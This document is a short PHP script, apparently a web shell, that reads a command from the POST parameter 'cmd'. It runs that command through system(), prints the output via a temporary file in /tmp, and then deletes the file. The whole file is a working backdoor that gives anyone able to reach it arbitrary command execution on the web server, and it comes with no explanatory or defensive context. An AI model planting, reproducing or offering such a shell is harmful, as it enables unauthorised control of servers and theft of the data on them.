<?php
$cmd = $_POST['cmd'];

ob_start();
system("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
exit;
?>

